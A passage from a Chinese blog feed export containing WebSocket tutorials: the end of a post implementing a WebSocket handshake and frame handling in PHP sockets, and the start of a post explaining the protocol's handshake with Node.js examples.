function_ invoke__">socket_bind</span>(<span class="variable">$this</span>-&gt;master, <span class="variable">$address</span>, <span class="variable">$port</span>)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;socket_bind() failed&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">socket_listen</span>(<span class="variable">$this</span>-&gt;master, <span class="number">2</span>)</span><br><span class="line">            <span class="keyword">or</span> <span class="keyword">die</span>(<span class="string">&quot;socket_listen() failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sockets[] = <span class="variable language_">$this</span>-&gt;master;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// debug</span></span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;Master socket  : &quot;</span>.<span class="variable language_">$this</span>-&gt;master.<span class="string">&quot;\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="comment">//自动选择来消息的 socket 如果是握手 自动选择主机</span></span><br><span class="line">            <span class="variable">$write</span> = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="variable">$except</span> = <span class="literal">NULL</span>;</span><br><span class="line">            <span class="title function_ invoke__">socket_select</span>(<span class="variable">$this</span>-&gt;sockets, <span class="variable">$write</span>, <span class="variable">$except</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;sockets <span class="keyword">as</span> <span class="variable">$socket</span>) &#123;</span><br><span class="line">                <span class="comment">//连接主机的 client </span></span><br><span class="line">                <span class="keyword">if</span> (<span class="variable">$socket</span> == <span class="variable language_">$this</span>-&gt;master)&#123;</span><br><span class="line">                    <span class="variable">$client</span> = <span class="title function_ invoke__">socket_accept</span>(<span class="variable">$this</span>-&gt;master);</span><br><span class="line">                    <span class="keyword">if</span> (<span class="variable">$client</span> &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                        <span class="comment">// debug</span></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;socket_accept() failed&quot;</span>;</span><br><span class="line">                        <span class="keyword">continue</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">//connect($client);</span></span><br><span class="line">                        <span class="title function_ invoke__">array_push</span>(<span class="variable">$this</span>-&gt;sockets, <span class="variable">$client</span>);</span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;connect client\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="variable">$bytes</span> = @<span class="title function_ invoke__">socket_recv</span>(<span class="variable">$socket</span>,<span class="variable">$buffer</span>,<span class="number">2048</span>,<span class="number">0</span>);</span><br><span class="line">                    <span class="keyword">if</span>(<span class="variable">$bytes</span> == <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">                    <span class="keyword">if</span> (!<span class="variable language_">$this</span>-&gt;handshake) &#123;</span><br><span class="line">                        <span class="comment">// 如果没有握手，先握手回应</span></span><br><span class="line">                        <span class="comment">//doHandShake($socket, $buffer);</span></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;shakeHands\n&quot;</span>;</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="comment">// 如果已经握手，直接接受数据，并处理</span></span><br><span class="line">                        <span class="variable">$buffer</span> = <span class="title function_ invoke__">decode</span>(<span class="variable">$buffer</span>);</span><br><span class="line">                        <span class="comment">//process($socket, $buffer); </span></span><br><span class="line">                        <span class="keyword">echo</span> <span class="string">&quot;send file\n&quot;</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">demo.php 握手连接测试代码</span><br></pre></td></tr></table></figure><p>上面这段代码是经过我调试了的，没太大的问题，如果想测试的话，可以在 cmd 命令行中键入 <code>php /path/to/demo.php</code>;当然，上面只是一个类，如果要测试的话，还得新建一个实例。</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="symbol">$ws</span> = <span class="keyword">new</span> WS(<span class="string">&#x27;localhost&#x27;</span>, <span class="number">4000</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端代码可以稍微简单点：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://localhost:4000&quot;</span>);</span><br><span class="line">ws.onopen = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;握手成功&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">ws.onerror = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>运行服务器代码，当客户端连接的时候，我们可以看到：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/25124555-64ad002702334156a80bedef37fbf361.jpg" alt=""></p><p>通过上面的代码可以清晰的看到整个交流的过程。首先是建立连接，node 中这一步已经封装到了 net 和 http 模块，然后判断是否握手，如果没有的话，就 shakeHands。这里的握手我直接就 echo 了一个单词，表示进行了这个东西，<a href="http://www.cnblogs.com/hustskyking/p/websocket-with-node.html" target="_blank">前文</a>我们提到过握手算法，这里就直接写了。</p><h4>2. 提取 Sec-WebSocket-Key 信息</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getKey</span>(<span class="params"><span class="variable">$req</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/Sec-WebSocket-Key: (.*)\r\n/&quot;</span>, <span class="variable">$req</span>, <span class="variable">$match</span>)) &#123;</span><br><span class="line">        <span class="variable">$key</span> = <span class="variable">$match</span>[<span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里比较简单，直接正则匹配，websocket 信息头一定包含 Sec-WebSocket-Key，所以我们匹配起来也比较快捷~</p><h4>3. 加密 Sec-WebSocket-Key</h4><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encry</span>(<span class="params"><span class="variable">$req</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getKey</span>(<span class="variable">$req</span>);</span><br><span class="line">    <span class="variable">$mask</span> = <span class="string">&quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">sha1</span>(<span class="variable">$key</span> . <span class="string">&#x27;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#x27;</span>, <span class="literal">true</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将 SHA-1 加密后的字符串再进行一次 base64 加密。如果加密算法错误，客户端在进行校检的时候会直接报错：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/25124720-0518fd35df2c4f7a91f624e4bbf2ec6c.jpg" alt=""></p><h4>4. 应答 Sec-WebSocket-Accept</h4><figure class="highlight swift"><table><tr><td class="code"><pre><span class="line">function dohandshake(<span class="variable">$socket</span>, <span class="variable">$req</span>)&#123;</span><br><span class="line">    <span class="comment">// 获取加密key</span></span><br><span class="line">    <span class="variable">$acceptKey</span> <span class="operator">=</span> <span class="variable">$this</span>-&gt;encry(<span class="variable">$req</span>);</span><br><span class="line">    <span class="variable">$upgrade</span> <span class="operator">=</span> <span class="string">&quot;HTTP/1.1 101 Switching Protocols<span class="subst">\r</span><span class="subst">\n</span>&quot;</span> .</span><br><span class="line">               <span class="string">&quot;Upgrade: websocket<span class="subst">\r</span><span class="subst">\n</span>&quot;</span> .</span><br><span class="line">               <span class="string">&quot;Connection: Upgrade<span class="subst">\r</span><span class="subst">\n</span>&quot;</span> .</span><br><span class="line">               <span class="string">&quot;Sec-WebSocket-Accept: &quot;</span> . <span class="variable">$acceptKey</span> . <span class="string">&quot;<span class="subst">\r</span><span class="subst">\n</span>&quot;</span> .</span><br><span class="line">               <span class="string">&quot;<span class="subst">\r</span><span class="subst">\n</span>&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 写入socket</span></span><br><span class="line">    socket_write(socket,<span class="variable">$upgrade</span>.chr(<span class="number">0</span>), strlen(<span class="variable">$upgrade</span>.chr(<span class="number">0</span>)));</span><br><span class="line">    <span class="comment">// 标记握手已经成功，下次接受数据采用数据帧格式</span></span><br><span class="line">    <span class="variable">$this</span>-&gt;handshake <span class="operator">=</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里千万要注意，每一个请求和相应的格式，最后有一个空行，也就是 <code>\r\n</code>，开始测试的时候把这东西给弄丢了，纠结了半天。</p><p><img src="https://images.cnitblog.com/blog/387325/201312/25124605-f1c4f57be53a43b1bcfb20392fe6c18a.jpg" alt=""></p><p>当客户端成功校检key后，会触发 onopen 函数：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/25124618-53351ac2263d4ca89be4bd7eaca1968c.jpg" alt=""></p><h4>5. 数据帧处理</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">// 解析数据帧</span><br><span class="line">function decode($buffer)  &#123;</span><br><span class="line">    $len = $masks = $data = $decoded = null;</span><br><span class="line">    $len = <span class="keyword">ord</span>($buffer[<span class="number">1</span>]) &lt; <span class="number">127</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ($len === <span class="number">126</span>)  &#123;</span><br><span class="line">        $masks = <span class="keyword">substr</span>($buffer, <span class="number">4</span>, <span class="number">4</span>);</span><br><span class="line">        $data = <span class="keyword">substr</span>($buffer, <span class="number">8</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> ($len === <span class="number">127</span>)  &#123;</span><br><span class="line">        $masks = <span class="keyword">substr</span>($buffer, <span class="number">10</span>, <span class="number">4</span>);</span><br><span class="line">        $data = <span class="keyword">substr</span>($buffer, <span class="number">14</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span>  &#123;</span><br><span class="line">        $masks = <span class="keyword">substr</span>($buffer, <span class="number">2</span>, <span class="number">4</span>);</span><br><span class="line">        $data = <span class="keyword">substr</span>($buffer, <span class="number">6</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> ($index = <span class="number">0</span>; $index &lt; strlen($data); $index++) &#123;</span><br><span class="line">        $decoded .= $data[$index] ^ $masks[$index % <span class="number">4</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $decoded;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里涉及的编码问题在前文中已经提到过了，这里就不赘述，php 对字符处理的函数太多了，也记得不是特别清楚，这里就没有详细的介绍解码程序，直接把客户端发送的数据原样返回，可以算是一个聊天室的模式吧。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 返回帧信息处理</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">frame</span>(<span class="params"><span class="variable">$s</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">str_split</span>(<span class="variable">$s</span>, <span class="number">125</span>);</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">count</span>(<span class="variable">$a</span>) == <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;\x81&quot;</span> . <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$a</span>[<span class="number">0</span>])) . <span class="variable">$a</span>[<span class="number">0</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$ns</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$o</span>) &#123;</span><br><span class="line">        <span class="variable">$ns</span> .= <span class="string">&quot;\x81&quot;</span> . <span class="title function_ invoke__">chr</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$o</span>)) . <span class="variable">$o</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$ns</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 返回数据</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">send</span>(<span class="params"><span class="variable">$client</span>, <span class="variable">$msg</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$msg</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">frame</span>(<span class="variable">$msg</span>);</span><br><span class="line">    <span class="title function_ invoke__">socket_write</span>(<span class="variable">$client</span>, <span class="variable">$msg</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$msg</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws = <span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://localhost:4000&quot;</span>);</span><br><span class="line">ws.onopen = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;握手成功&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">ws.onmessage = <span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;message:&quot;</span> + e.data);</span><br><span class="line">&#125;;</span><br><span class="line">ws.onerror = <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">    <span class="built_in">console</span>.<span class="built_in">log</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;;</span><br><span class="line">ws.send(<span class="string">&quot;李靖&quot;</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在连通之后发送数据，服务器原样返回：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/25124629-a1d032dbd01a4a958cae055a99c964eb.jpg" alt=""></p><h3>二、注意问题</h3><h4>1. websocket 版本问题</h4><p>客户端在握手时的请求中有<code>Sec-WebSocket-Version: 13</code>，这样的版本标识，这个是一个升级版本，现在的浏览器都是使用的这个版本。而以前的版本在数据加密的部分更加麻烦，它会发送两个key：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>server.example.com</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://example.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Protocol</span><span class="punctuation">: </span>chat, superchat</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key1</span><span class="punctuation">: </span>xxxx</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key2</span><span class="punctuation">: </span>xxxx</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如果是这种版本（比较老，已经没在使用了），需要通过下面的方式获取</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> encry(<span class="variable">$key1</span>,<span class="variable">$key2</span>,<span class="variable">$l8b</span>)&#123; <span class="regexp">//</span>Get the numbers preg_match_all(<span class="string">&#x27;/([\d]+)/&#x27;</span>, <span class="variable">$key1</span>, <span class="variable">$key1_num</span>); preg_match_all(<span class="string">&#x27;/([\d]+)/&#x27;</span>, <span class="variable">$key2</span>, <span class="variable">$key2_num</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$key1_num</span> = implode(<span class="variable">$key1_num</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$key2_num</span> = implode(<span class="variable">$key2_num</span>[<span class="number">0</span>]);</span><br><span class="line">    <span class="regexp">//</span>Count spaces</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/([ ]+)/&#x27;</span>, <span class="variable">$key1</span>, <span class="variable">$key1_spc</span>);</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/([ ]+)/&#x27;</span>, <span class="variable">$key2</span>, <span class="variable">$key2_spc</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$key1_spc</span>==<span class="number">0</span>|<span class="variable">$key2_spc</span>==<span class="number">0</span>)&#123; <span class="variable">$this</span>-&gt;log(<span class="string">&quot;Invalid key&quot;</span>);return; &#125;</span><br><span class="line">    <span class="regexp">//</span>Some math</span><br><span class="line">    <span class="variable">$key1_sec</span> = pack(<span class="string">&quot;N&quot;</span>,<span class="variable">$key1_num</span> / <span class="variable">$key1_spc</span>);</span><br><span class="line">    <span class="variable">$key2_sec</span> = pack(<span class="string">&quot;N&quot;</span>,<span class="variable">$key2_num</span> / <span class="variable">$key2_spc</span>);</span><br><span class="line"></span><br><span class="line">    return md5(<span class="variable">$key1_sec</span>.<span class="variable">$key2_sec</span>.<span class="variable">$l8b</span>,<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>只能无限吐槽这种验证方式！相比 nodeJs 的 websocket 操作方式：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务器程序</span></span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WS</span> = <span class="string">&#x27;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#x27;</span>;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>).<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">o</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> key;</span><br><span class="line">    o.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!key)&#123;</span><br><span class="line">            <span class="comment">//握手</span></span><br><span class="line">            key = e.<span class="title function_">toString</span>().<span class="title function_">match</span>(<span class="regexp">/Sec-WebSocket-Key: (.+)/</span>)[<span class="number">1</span>];</span><br><span class="line">            key = crypto.<span class="title function_">createHash</span>(<span class="string">&#x27;sha1&#x27;</span>).<span class="title function_">update</span>(key + <span class="variable constant_">WS</span>).<span class="title function_">digest</span>(<span class="string">&#x27;base64&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;HTTP/1.1 101 Switching Protocols\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Upgrade: websocket\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Connection: Upgrade\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;Sec-WebSocket-Accept: &#x27;</span> + key + <span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">            o.<span class="title function_">write</span>(<span class="string">&#x27;\r\n&#x27;</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e);</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8000</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>多么简洁，多么方便！有谁还愿意使用 php 呢。。。。</p><h4>2. 数据帧解析代码</h4><p>本文没有给出 decodeFrame 这样数据帧解析代码，前文中给出了数据帧的格式，解析纯属体力活。</p><h4>3. 代码下载</h4><p>对这部分感兴趣的同学，可以再去深究。提供了<a href="http://files.cnblogs.com/hustskyking/ws.zip" target="_blank">参考代码下载</a>。</p><h4>4. 相关开源库参考</h4><p><a href="http://socketo.me" target="_blank">http://socketo.me</a> Ratchet 为 php 封装的一个 WebSockets 库。 ]</p><p>Google 上搜索 <a href="//www.google.com.hk/search?q=php+websocket+class" target="_blank">php+websoket+class</a>，也能找到不少相关的资料。</p><h3>三、参考资料</h3><ul><li><a href="http://www.php.net/manual/zh/ref.sockets.php" target="_blank">http://www.php.net/manual/zh/ref.sockets.php</a> php manual</li><li><a href="http://www.rfc-editor.org/rfc/rfc6455.txt" target="_blank">http://www.rfc-editor.org/rfc/rfc6455.txt</a>&nbsp;&nbsp;[<a href="http://www.rfc-editor.org/rfc/rfc6455.txt">RFC6455</a>] WebSocket</li></ul>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> tech </tag>
            
            <tag> cnblogs </tag>
            
            <tag> PHP </tag>
            
            <tag> websocket </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>细说WebSocket - Node篇</title>
      <link href="/blog/2013/12/20/cb-websocket-with-node/"/>
      <url>/blog/2013/12/20/cb-websocket-with-node/</url>
      
        <content type="html"><![CDATA[<p>在上一篇提高到了 <a href="http://www.cnblogs.com/hustskyking/p/web-communication.html" target="_blank">web 通信的各种方式</a>，包括 轮询、长连接 以及各种 HTML5 中提到的手段。本文将详细描述 WebSocket协议 在 web通讯 中的实现。</p><h3>一、WebSocket 协议</h3><h4>1. 概述</h4><p>websocket协议允许不受信用的客户端代码在可控的网络环境中控制远程主机。该协议包含一个握手和一个基本消息分帧、分层通过TCP。简单点说，通过握手应答之后，建立安全的信息管道，这种方式明显优于<a href="http://www.cnblogs.com/hustskyking/p/web-communication.html" target="_blank">前文</a>所说的基于 XMLHttpRequest 的 iframe 数据流和长轮询。该协议包括两个方面，握手链接（handshake）和数据传输（data transfer）。</p><h4>2. 握手连接</h4><p>这部分比较简单，就像路上遇到熟人问好。</p><figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Client</span>：嘿，大哥，有火没？（烟递了过去）</span><br><span class="line"><span class="built_in">Server</span>：哈，有啊，来~ （点上）</span><br><span class="line"><span class="built_in">Client</span>：火柴啊，也行！（烟点上，验证完毕）</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>握手连接中，client 先主动伸手：</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/chat</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>server.example.com</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Key</span><span class="punctuation">: </span>dGhlIHNhbXBsZSBub25jZQ==</span><br><span class="line"><span class="attribute">Origin</span><span class="punctuation">: </span>http://example.com</span><br><span class="line"><span class="attribute">Sec-WebSocket-Protocol</span><span class="punctuation">: </span>chat, superchat</span><br><span class="line"><span class="attribute">Sec-WebSocket-Version</span><span class="punctuation">: </span>13</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端发了一串 Base64 加密的密钥过去，也就是上面你看到的 Sec-WebSocket-Key。 Server 看到 Client 打招呼之后，悄悄地告诉 Client 他已经知道了，顺便也打个招呼。</p><figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="meta">HTTP/1.1</span> <span class="number">101</span> Switching Protocols</span><br><span class="line"><span class="attribute">Upgrade</span><span class="punctuation">: </span>websocket</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Upgrade</span><br><span class="line"><span class="attribute">Sec-WebSocket-Accept</span><span class="punctuation">: </span>s3pPLMBiTxaQ9kYGzzhZRbK+xOo=</span><br><span class="line"><span class="attribute">Sec-WebSocket-Protocol</span><span class="punctuation">: </span>chat</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Server 返回了 Sec-WebSocket-Accept 这个应答，这个应答内容是通过一定的方式生成的。生成算法是：</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">mask</span>  = <span class="string">&quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;</span><span class="comment">;  // 这是算法中要用到的固定字符串</span></span><br><span class="line"><span class="attr">accept</span> = base64( sha1( key + mask ) )<span class="comment">;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>key 和 mask 串接之后经过 SHA-1 处理，处理后的数据再经过一次 Base64 加密。分解动作：</p><figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>. t = <span class="string">&quot;GhlIHNhbXBsZSBub25jZQ==&quot;</span> + <span class="string">&quot;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;</span></span><br><span class="line">   -&gt; <span class="string">&quot;GhlIHNhbXBsZSBub25jZQ==258EAFA5-E914-47DA-95CA-C5AB0DC85B11&quot;</span></span><br><span class="line"><span class="number">2</span>. s = sha1(t)</span><br><span class="line">   -&gt; <span class="number">0xb3</span> <span class="number">0x7a</span> <span class="number">0x4f</span> <span class="number">0x2c</span> <span class="number">0xc0</span> <span class="number">0x62</span> <span class="number">0x4f</span> <span class="number">0x16</span> <span class="number">0x90</span> <span class="number">0xf6</span></span><br><span class="line">      <span class="number">0x46</span> <span class="number">0x06</span> <span class="number">0xcf</span> <span class="number">0x38</span> <span class="number">0x59</span> <span class="number">0x45</span> <span class="number">0xb2</span> <span class="number">0xbe</span> <span class="number">0xc4</span> <span class="number">0xea</span></span><br><span class="line"><span class="number">3</span>. base64(s)</span><br><span class="line">   -&gt; <span class="string">&quot;s3pPLMBiTxaQ9kYGzzhZRbK+xOo=&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面 Server 端返回的 HTTP 状态码是 101，如果不是 101 ，那就说明握手一开始就失败了~</p><p>下面就来个 demo，跟服务器握个手：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>).<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">o</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> key;</span><br><span class="line">    o.<span class="title function_">on</span>(<span class="string">&#x27;data&#x27;</span>,<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!key)&#123;</span><br><span class="line">            <span class="comment">// 握手</span></span><br><span class="line">            <span class="comment">// 应答部分，代码先省略</span></span><br><span class="line">            <span class="variable language_">console</span>.<span class="title function_">log</span>(e.<span class="title function_">toString</span>());</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;).<span class="title function_">listen</span>(<span class="number">8000</span>);</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>客户端代码：</p><figure class="highlight arcade"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> ws=<span class="keyword">new</span> WebSocket(<span class="string">&quot;ws://127.0.0.1:8000&quot;</span>);</span><br><span class="line">ws.onerror=<span class="keyword">function</span>(<span class="params">e</span>)&#123;</span><br><span class="line">  <span class="built_in">console</span>.<span class="built_in">log</span>(e);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>上面当然是一串不完整的代码，目的是演示握手过程中，客户端给服务端打招呼。在控制台我们可以看到：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20133038-3e86224009f348619e44b835455d86c8.jpg" alt=""></p><p>看起来很熟悉吧，其实就是发送了一个 HTTP 请求，这个我们在浏览器的 Network 中也可以看到：</p><p><img src="https://images.cnitblog.com/blog/387325/201312/20133046-6882b98bedf44b46a5598d74d98531d3.jpg" alt=""></p><p>但是 WebSocket协议 并不是 HTTP 协议，刚开始验证的时候借用了 HTTP 的头，连接成功之后的通信就不是 HTTP 了，不信你用 fiddler2 抓包试试，肯定是拿不到的，后面的通信部分是基于 TCP 的连接。</p><p>服务器要成功的进行通信，必须有应答，往下看：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//服务器程序</span></span><br><span class="line"><span class="keyword">var</span> crypto = <span class="built_in">require</span>(<span class="string">&#x27;crypto&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> <span class="variable constant_">WS</span> = <span class="string">&#x27;258EAFA5-E914-47DA-95CA-C5AB0DC85B11&#x27;</span>;</span><br><span class="line"><span class="built_in">require</span>(<span class="string">&#x27;net&#x27;</span>).<span class="title function_">createServer</span>(<span class="keyword">function</span>(<span class="params">o</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> key;</span><br><span class="line">    o.<span class="title 